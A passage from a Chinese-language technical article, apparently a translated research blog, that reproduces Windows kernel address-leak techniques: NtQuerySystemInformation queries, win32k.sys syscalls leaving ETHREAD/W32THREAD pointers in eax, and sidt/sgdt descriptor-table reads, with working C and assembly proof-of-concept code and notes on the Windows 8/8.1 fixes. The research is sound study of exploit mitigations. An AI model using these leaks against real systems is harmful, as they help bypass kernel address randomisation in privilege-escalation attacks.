#endif</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">此外，还必须修修改打印锁地址的printf语句，使其支持64位地址。&nbsp;</span></p><pre class="brush:bash;toolbar:false">#ifdef&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Lock&nbsp;Address&nbsp;0x%llx\t&quot;,&nbsp;lockAddress);
#else
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Lock&nbsp;Address&nbsp;0x%X\t&quot;,&nbsp;lockAddress);
#endif</pre><p style="text-indent: 2em;">&nbsp;<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">之后，它就可以在64位Windows 8上面正常使用了：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t016397c8631299af30.png" title="t01cbb72c42a4724480.png" alt="http://p0.qhimg.com/t01cbb72c42a4724480.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最终的代码也可以从Github上下载。 </span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">SystemExtendedProcessInformation</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">SystemExtendedProcessInformation所需的改动也很少，只要在SYSTEM_THREAD_INFORMATION结构中填充128位即可——它肯定是有用处的，但具体我还不太清楚。</span></p><pre class="brush:bash;toolbar:false">#ifdef&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Reserved[4];
#endif
}SYSTEM_THREAD_INFORMATION,&nbsp;*PSYSTEM_THREAD_INFORMATION;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">另外，处理地址的printf语句需要像前面介绍的那样进行相应的更新。</span></p><p><br/></p><pre class="brush:bash;toolbar:false">#ifdef&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Stack&nbsp;base&nbsp;0x%llx\t&quot;,&nbsp;stackBase);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Stack&nbsp;limit&nbsp;0x%llx\r\n&quot;,&nbsp;stackLimit);
#else
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Stack&nbsp;base&nbsp;0x%X\t&quot;,&nbsp;stackBase);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Stack&nbsp;limit&nbsp;0x%X\r\n&quot;,&nbsp;stackLimit);
#endif</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">完成上述修改之后，代码就可以在64位Windows 8上面正常运行了：</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t010813f5455f059ad6.png" title="t01a1aad8c061395067.png" alt="http://p9.qhimg.com/t01a1aad8c061395067.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最终的代码也可以从Github上下载。 </span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br/></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">Windows 8.1 64 bit onward</span></strong></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">至于在Windows 8.1上修改这些代码方面，我还是多少有点优势的：毕竟我早就阅读过Alex Ionescu的一篇文章，因此我知道可通过一种稍微不同的方式来运行二进制代码。 在Windows Vista中引入了完整性级别的概念，这将导致所有进程在下面所示的六个完整性级别之一上面运行。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t011b6eeda36eb29600.png" title="t019d902a46916fef2c.png" alt="http://p9.qhimg.com/t019d902a46916fef2c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">完整性级别较高的进程可以访问更多的系统资源，例如沙盒进程通常是在较低的完整性级别上面运行，并且对系统其余部分的访问权限是最小的。 更多的细节可以在上面链接的MSDN页面上找到。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我创建了一个完整性水平较低的cmd.exe副本，具体方法请参见这里。当我试图在这个命令提示符下面运行NtQuerySystemInformation的二进制代码时，就会得到错误代码0xC0000022：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0195738dc8515f0776.png" title="t0121de1231b4fd03b2.png" alt="http://p3.qhimg.com/t0121de1231b4fd03b2.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">STATUS_ACCESS_DENIED的这个NTSTATUS代码定义如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">进程已请求访问对象，但尚未授予这些访问权限。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是，如果在中等完整性级别的命令提示符下运行该二进制代码话，则一切正常： </span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这意味着必须向函数添加完整性级别检查。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01694ea340adde888b.png" title="t013ba7787ea77f3b69.png" alt="http://p7.qhimg.com/t013ba7787ea77f3b69.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">您可以使用SysInternals中的procexp查看完整性级别进程（见最后一列）：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t018c166ad5cb628098.png" title="t01970a86ee66a867a2.png" alt="http://p6.qhimg.com/t01970a86ee66a867a2.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这时我开始研究，为了添加了该项检查，NtQuerySystemInformation在Windows 8和8.1之间发生了哪些变化。利用IDA考察NtQuerySystemInformation函数后，我发现它依赖于调用“ExpQueryInformationProcess”函数。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t015f1181d53b19aed4.png" title="t014ad65c453e92a3ca.png" alt="http://p5.qhimg.com/t014ad65c453e92a3ca.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过Diaphora检查这两个版本的ntoskrnl.exe的差异，我发现这个函数在两个操作系统版本之间发生了重大变化。 </span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t014bcfaaa25809e120.png" title="t0176f42294f39d92a8.png" alt="http://p1.qhimg.com/t0176f42294f39d92a8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过比较两个实现汇编代码的不同之处，很容易就可以看出，这里添加了一个对“ExIsRestrictedCaller”的调用，通过交叉引用可以获悉，它主要是从ExpQuerySystemInformation中调用的，并且在相关函数中也被调用了几次。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t0177b9b79d9cb6d123.png" title="t0165fb588374b6bb50.png" alt="http://p4.qhimg.com/t0165fb588374b6bb50.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我还看了一下函数本身，我注释的汇编代码见下文。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01be516d71c25bfba4.png" title="t0141e40b095f625e66.png" alt="http://p5.qhimg.com/t0141e40b095f625e66.png"/></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);">根据我的理解，该函数的工作机制为：</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1、检查在ecx中传递给它的未知值是否为0，如果是的话就返回0</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2、使用PsReferencePrimaryToken增加调用进程令牌的引用计数</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3、使用SeQueryInformationToken将调用进程令牌的TokenIntegrityLevel读入一个局部变量</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4、使用ObDereferenceObject减少调用进程令牌的引用计数</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">5、检查SeQueryInformationToken是否返回错误代码，如果是就返回1</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">6、如果SeQueryInformationToken成功，将读取令牌完整性级别，并与0x2000（这个值表示中等完整性级别）进行比较</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">7、如果令牌完整性级别低于0x2000则返回1，否则返回0</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Alex Ionescu在他的博客上提供了这个函数的逆向版本。 每次该函数被调用时，它就返回1，然后调用函数将返回前面提到的错误代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">Win32k.sys系统调用信息泄露 &nbsp;</span></strong><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Windows 7 32 bit</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个问题最初是由j00ru在发布白皮书几个月前发现的，并在原始博客文章中有更深入的讨论。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">问题是，win32k.sys中的一些系统调用的返回值是小于32位的，例如VOID或USHORT，所以，在返回之前没有清除eax寄存器。 由于各种原因，在调用返回之前，内核地址在eax中结束，因此在调用之后立即读取eax，这些地址就会被完全暴露或部分暴露。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">例如NtUserModifyUserStartupInfoFlags就完全暴露了ETHREAD结构的地址，下面你可以看到，在该函数返回之前调用了UserSessionSwitchLeaveCrit，这似乎向eax中加载了一个指向ETHREAD的指针，但是，由于函数返回之前没有清空寄存器的内容，导致这个地址完整保留了下来。</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01845d258b5a9bb93d.png" title="t01762ed7e4f88ad4f8.png" alt="http://p0.qhimg.com/t01762ed7e4f88ad4f8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">要想使用这些系统调用来泄漏地址，我们首先需要添加标准include和Winddi，因为它们定义了将要调用的函数使用的一些GDI（图形设备接口）的结构。</span></p><pre class="brush:bash;toolbar:false">#include&nbsp;&quot;stdafx.h&quot;
#include&nbsp;&lt;Windows.h&gt;
#include&nbsp;&lt;Winddi.h&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我决定，通过使用其用户空间包装器（在这种情况下是user32.dll和gdi32.dll）来调用这些系统调用，因此我需要获取DLL中的函数的偏移量。为此，我把该dll拖拽到IDA中，将反汇编重定位到0，然后过滤函数列表以寻找目标函数。这样，找到的函数的起始地址是我需要的dll的偏移量。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我选择了一个完全泄漏ETHREAD的函数，以及一个部分泄漏它的函数。类似的方法同样适用于W32THREAD。</span></p><pre class="brush:bash;toolbar:false">//0x64D4B&nbsp;-&nbsp;NtUserModifyUserStartupInfoFlags
typedef&nbsp;DWORD(NTAPI&nbsp;*&nbsp;lNtUserModifyUserStartupInfoFlags)(DWORD&nbsp;Set,&nbsp;DWORD&nbsp;Flags);
//0xA2F4&nbsp;-&nbsp;NtUserGetAsyncKeyState
typedef&nbsp;DWORD(NTAPI&nbsp;*lNtUserGetAsyncKeyState)(DWORD&nbsp;key);
&nbsp;
//0x47123&nbsp;-&nbsp;NtGdiFONTOBJ_vGetInfo
typedef&nbsp;VOID(NTAPI&nbsp;*&nbsp;lNtGdiFONTOBJ_vGetInfo)(FONTOBJ&nbsp;*pfo,ULONG&nbsp;cjSize,FONTINFO&nbsp;*pfi);
//0x47263&nbsp;-&nbsp;NtGdiPATHOBJ_vEnumStartClipLines
typedef&nbsp;VOID(NTAPI&nbsp;*&nbsp;lNtGdiPATHOBJ_vEnumStartClipLines)(PATHOBJ&nbsp;*ppo,&nbsp;CLIPOBJ&nbsp;*pco,&nbsp;SURFOBJ&nbsp;*pso,&nbsp;LINEATTRS&nbsp;*pla);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为了调用这些函数，我们首先需要一个处理它们所在的DLL的句柄，所以，我们首先设法得到user32.dll的句柄。</span></p><pre class="brush:bash;toolbar:false">HMODULE&nbsp;hUser32&nbsp;=&nbsp;LoadLibraryA(&quot;user32.dll&quot;);
if&nbsp;(hUser32&nbsp;==&nbsp;NULL)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Failed&nbsp;to&nbsp;load&nbsp;user32&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果上述代码成功运行，我们就可以把第一个函数的偏移量与HMODULE的值相加，从而获得函数入口点，然后就可以将其转换为正确的类型了。</span></p><pre class="brush:bash;toolbar:false">lNtUserGetAsyncKeyState&nbsp;pNtUserGetAsyncKeyState&nbsp;=&nbsp;(lNtUserGetAsyncKeyState)((DWORD_PTR)hUser32&nbsp;+&nbsp;0xA2F4);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后，我们调用该函数并使用内联汇编来获取在eax中留下的值，并打印出来。</span></p><pre class="brush:bash;toolbar:false">pNtUserGetAsyncKeyState(20);
unsigned&nbsp;int&nbsp;ethread&nbsp;=&nbsp;0;
__asm&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ethread,&nbsp;eax;
}
printf(&quot;NtUserGetAsyncKeyState&nbsp;ETHREAD&nbsp;partial&nbsp;disclosure:&nbsp;0x%X\r\n&quot;,&nbsp;ethread);</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">然后，我们对NtUserModifyUserStartupInfoFlags进行同样的处理。</span></p><pre class="brush:bash;toolbar:false">lNtUserModifyUserStartupInfoFlags&nbsp;pNtUserModifyUserStartupInfoFlags&nbsp;=&nbsp;(lNtUserModifyUserStartupInfoFlags)((DWORD_PTR)hUser32&nbsp;+&nbsp;0x64D4B);
&nbsp;
pNtUserModifyUserStartupInfoFlags(20,&nbsp;12);
unsigned&nbsp;ethread_full&nbsp;=&nbsp;0;
__asm&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ethread_full,&nbsp;eax;
}
printf(&quot;NtUserModifyUserStartupInfoFlags&nbsp;ETHREAD&nbsp;full&nbsp;disclosure:&nbsp;0x%X\r\n&quot;,&nbsp;ethread_full);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来，我们需要调用暴露W32THREAD指针的函数，它们都是在gdi32.dll中定义的，所以我们需要得到该DLL的句柄，然后就可以像前面那样来调用这些函数了。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:bash;toolbar:false">HMODULE&nbsp;hGDI32&nbsp;=&nbsp;LoadLibraryA(&quot;gdi32.dll&quot;);
if&nbsp;(hGDI32&nbsp;==&nbsp;NULL)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Failed&nbsp;to&nbsp;load&nbsp;gdi32&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
}
&nbsp;
lNtGdiFONTOBJ_vGetInfo&nbsp;pNtGdiFONTOBJ_vGetInfo&nbsp;=&nbsp;(lNtGdiFONTOBJ_vGetInfo)((DWORD_PTR)hGDI32&nbsp;+&nbsp;NtGdiFONTOBJ_vGetInfoAddress);
FONTOBJ&nbsp;surf&nbsp;=&nbsp;{&nbsp;0&nbsp;};
FONTINFO&nbsp;finfo&nbsp;=&nbsp;{&nbsp;0&nbsp;};
pNtGdiFONTOBJ_vGetInfo(&amp;surf,&nbsp;123,&nbsp;&amp;finfo);
&nbsp;
long&nbsp;int&nbsp;w32thread&nbsp;=&nbsp;0;
__asm&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;w32thread,&nbsp;eax;
}
&nbsp;
printf(&quot;NtGdiEngUnLockSurface&nbsp;W32THREAD&nbsp;full&nbsp;disclosure:&nbsp;0x%X\r\n&quot;,&nbsp;w32thread);
&nbsp;
lNtGdiPATHOBJ_vEnumStartClipLines&nbsp;pNtGdiPATHOBJ_vEnumStartClipLines&nbsp;=&nbsp;(lNtGdiPATHOBJ_vEnumStartClipLines)((DWORD_PTR)hGDI32&nbsp;+&nbsp;0x47263);
PATHOBJ&nbsp;pathobj&nbsp;=&nbsp;{&nbsp;0&nbsp;};
CLIPOBJ&nbsp;pco&nbsp;=&nbsp;{&nbsp;0&nbsp;};
SURFOBJ&nbsp;pso&nbsp;=&nbsp;{&nbsp;0&nbsp;};
LINEATTRS&nbsp;pla&nbsp;=&nbsp;{&nbsp;0&nbsp;};
pNtGdiPATHOBJ_vEnumStartClipLines(&amp;pathobj,&nbsp;&amp;pco,&nbsp;&amp;pso,&nbsp;&amp;pla);
w32thread&nbsp;=&nbsp;0;
__asm&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;w32thread,&nbsp;eax;
}
printf(&quot;NtGdiPATHOBJ_vEnumStartClipLines&nbsp;W32THREAD&nbsp;full&nbsp;disclosure:&nbsp;0x%X\r\n&quot;,&nbsp;w32thread);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">编译并运行代码，我们就可以看到被暴露的地址了。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01112f1daefde8e324.png" title="t01a433623d3aefd675.png" alt="http://p9.qhimg.com/t01a433623d3aefd675.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows 8 64 bit onward</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">要使代码在Windows 8上运行，必须首先更新函数偏移量来匹配新的主机VM的二进制代码。 请注意，这里缺少NtGdiFONTOBJ_vGetInfo函数的地址，因为该函数在Windows 8 VM的gdi32版本中没有相应的定义。</span></p><pre class="brush:bash;toolbar:false">//win8,&nbsp;64bit
#define&nbsp;NtUserModifyUserStartupInfoFlagsAddress&nbsp;0x263F0
#define&nbsp;NtUserGetAsyncKeyStateAddress&nbsp;0x3B30
#define&nbsp;NtGdiPATHOBJ_vEnumStartClipLinesAddress&nbsp;0x67590</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第二个问题是，Visual Studio不支持针对amd64代码的内联汇编，所以我添加了一个名为“asm_funcs.asm”的简短文件，具体内容如下所示：</span></p><pre class="brush:bash;toolbar:false">_DATA&nbsp;SEGMENT
_DATA&nbsp;ENDS
_TEXT&nbsp;SEGMENT
&nbsp;
PUBLIC&nbsp;get_rax
&nbsp;
get_rax&nbsp;PROC
ret
get_rax&nbsp;ENDP
_TEXT&nbsp;ENDS
END</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">所有这些实际上就是定义了一个名为“get_rax”的函数，虽然它什么都不做，但却会返回，并且根据调用约定，返回值将保存在rax中。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">此外，我们还必须对Visual Studio项目的配置稍作修改，以使其编译所包含的汇编代码，为此，可以在solution explorer中右键单击项目，转到“Build Dependencies” - &gt;“Build Customizations..”，然后在对话窗口中勾选&#39;masm&#39;选项。 Elias Bachaalany提供了更为详细的介绍，请访问这里。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">然后，通过将这个函数声明为一个外部函数，将该函数导入到主文件中。</span></p><pre class="brush:bash;toolbar:false">&nbsp;extern&nbsp;&quot;C&quot;&nbsp;unsigned&nbsp;long&nbsp;long&nbsp;get_rax();</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后，将相应的变量的长度改为64位，同时所有的printf语句也要进行相应的修改。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">最终的代码可以从Github上下载。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">忙活半天，终于可以在64位系统上运行我们的代码了，并且这个问题在Windows 8中也得到了修复！&nbsp;</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01cfcc99f3b16f4ced.png" title="t01e136efaa4fc2d7b1.png" alt="http://p2.qhimg.com/t01e136efaa4fc2d7b1.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Matt Miller在Black Hat USA 2012上的演讲的内核部分中讨论Windows 8漏洞利用缓解改进情况的时候，曾经引用了这个修复： </span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t0102e3befb3b91ad62.png" title="t016f57d027ae0b1199.png" alt="http://p7.qhimg.com/t016f57d027ae0b1199.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解决这些问题的方法非常简单，观察一下的从Windows 7和Windows 8中的win32.sys（如下图所示），我们可以看到，现在这些函数的实现方式中，调用敏感函数后所有的RAX被设置为一个新值。例如，在我考察过的两个泄露ETHREAD的函数中，UserSessionSwitchLeaveCrit导致返回前将泄露的地址放入RAX/ EAX中，这个问题已得到修复。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">NtUserGetAsyncKeyState：Windows 8的实现在左边，Windows 7的实现在右边。 以前，这会导致泄漏ETHREAD的部分地址，因为在函数返回之前，只有eax的前16位被修改，现在使用movsx后，它将对较高的位进行清零。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0104a6c0eeef692a01.png" title="t018eafca9d106c0c3f.png" alt="http://p6.qhimg.com/t018eafca9d106c0c3f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">NtUserModifyUserStartupInfoFlags：Windows 8的实现在左边，Windows 7的实现在右边。 以前，这会泄漏完整的ETHREAD地址，因为eax在返回之前根本没有被修改，现在eax被显式地设置为1。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t010491f3e8d2e83d8c.png" title="t01247b82619052e201.png" alt="http://p0.qhimg.com/t01247b82619052e201.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">描述符表 &nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Windows 7 32 bit</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">x86描述符表有各种用途，在j00ru的论文中考察的是中断描述符表（IDT），处理器用它查找处理中断和异常的代码，而全局描述符表（GDT） 由处理器使用以定义内存段。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">关于描述符表的更多细节请参考j00ru的论文，它们主要在内存隔离和特权隔离中扮演关键角色。全局描述符表寄存器（GDTR）定义了GDT的起始地址及其大小，它可以通过sgdt x86指令读取：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">SGDT仅对操作系统软件有用; 但是，它可以在应用程序中使用，并且不会生成异常。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这意味着在Ring 3中运行的代码可以读取GDTR的值且不会引起异常，但无法对它进行写入操作。 GDTR的格式如下：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01a9f2121aaab2a21f.png" title="t01520ca2bca0302777.png" alt="http://p0.qhimg.com/t01520ca2bca0302777.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">中断描述符表寄存器（IDTR）定义了IDT的起始地址及其大小，它可以使用sidt x86指令读取，并且与sgdt类似，也可以从ring 3调用，这一点真是带来了极大的便利性。IDTR的格式如下所示：</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t0121cc6be9e6674ce8.png" title="t012416f13986b70076.png" alt="http://p0.qhimg.com/t012416f13986b70076.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此外，Windows允许使用GetThreadSelectorEntry函数读取GDT中的特定表项。 在j00ru的论文中，他使用它来读取几个潜在的敏感表项，但是我将通过它来读取任务状态段（TSS）描述符。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们可以使用内联汇编以6字节缓冲区作为参数来执行sidt指令。</span></p><pre class="brush:bash;toolbar:false">unsigned&nbsp;char&nbsp;idtr[6]&nbsp;=&nbsp;{&nbsp;0&nbsp;};
__asm&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;sidt&nbsp;idtr;
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">读取idtr后，我们只需要从内存中提取相应的值，就可以打印它们了。</span></p><pre class="brush:bash;toolbar:false">unsigned&nbsp;int&nbsp;idtrBase&nbsp;=&nbsp;(unsigned&nbsp;int)idtr[5]&nbsp;&lt;&lt;&nbsp;24&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)idtr[4]&nbsp;&lt;&lt;&nbsp;16&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)idtr[3]&nbsp;&lt;&lt;&nbsp;8&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)idtr[2];
unsigned&nbsp;short&nbsp;idtrLimit&nbsp;=&nbsp;(unsigned&nbsp;int)idtr[1]&nbsp;&lt;&lt;&nbsp;8&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)idtr[0];
printf(&quot;Interrupt&nbsp;Descriptor&nbsp;Table&nbsp;Register&nbsp;base:&nbsp;0x%X,&nbsp;limit:&nbsp;0x%X\r\n&quot;,&nbsp;idtrBase,&nbsp;idtrLimit);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">同样，我们可以很容易地使用内联汇编来调用sgdt指令，然后提取基地址和极限值。</span></p><pre class="brush:bash;toolbar:false">unsigned&nbsp;char&nbsp;gdtr[6]&nbsp;=&nbsp;{&nbsp;0&nbsp;};
__asm&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;sgdt&nbsp;gdtr;
}
